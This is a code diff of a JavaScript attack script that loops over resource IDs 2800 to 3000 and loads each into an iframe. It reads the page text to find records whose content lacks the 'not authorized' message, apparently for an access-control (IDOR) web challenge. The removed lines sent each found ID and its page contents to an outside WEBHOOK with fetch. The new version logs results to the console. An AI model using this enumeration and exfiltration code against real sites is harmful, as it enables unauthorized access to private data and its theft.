@@ -13,25 +13,31 @@ function tryId(start = 2800, max = 3000) {
 
         const currentId = i;
 
-        iframe.onload = () => {
-            try {
-                const doc = iframe.contentDocument;
+       iframe.onload = () => {
+        console.log("LOADED", currentId);
+        
+        try {
+            const doc = iframe.contentDocument;
+        
+            if (!doc || !doc.body) {
+                console.log("no body", currentId);
+            } else {
                 const text = doc.body.textContent.trim();
-
-                if (text !== "You're not authorized to view this ressource!") {
-                    console.log("FOUND:", currentId);
-                    fetch(WEBHOOK + "?id=" + currentId + "&data=" + encodeURIComponent(text));
+                console.log(currentId, JSON.stringify(text));
+        
+                if (!text.includes("not authorized")) {
+                    console.log("FOUND", currentId);
                 }
-            } catch (e) {
-                console.log("error reading", currentId);
             }
+        } catch (e) {
+            console.log("ACCESS ERROR", currentId);
+        }
+        
+        iframe.remove();
+        i++;
+        setTimeout(next, 100);
+    };
 
-            iframe.remove();
-
-            console.log(currentId);
-            i++;
-            setTimeout(next, 30);
-        };
 
         iframe.src = TARGET + currentId;
 
